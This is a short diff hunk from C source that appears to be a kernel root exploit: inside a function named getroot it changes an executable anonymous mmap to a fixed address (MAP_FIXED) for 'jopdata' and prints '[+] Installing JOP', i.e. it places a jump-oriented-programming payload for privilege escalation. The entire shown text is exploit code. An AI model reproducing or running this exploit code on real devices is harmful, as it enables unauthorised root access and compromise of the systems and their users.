@@ -321,7 +321,7 @@ int getroot(struct offsets* o)
 	struct thread_info* ti;
 	void* jopdata;
 
-	if((jopdata = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0)) == (void*)-1)
+	if((jopdata = mmap((void*)((unsigned long)MMAP_ADDR + MMAP_SIZE), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0)) == (void*)-1)
 		return -ENOMEM;
 
 	printf("[+] Installing JOP\n");
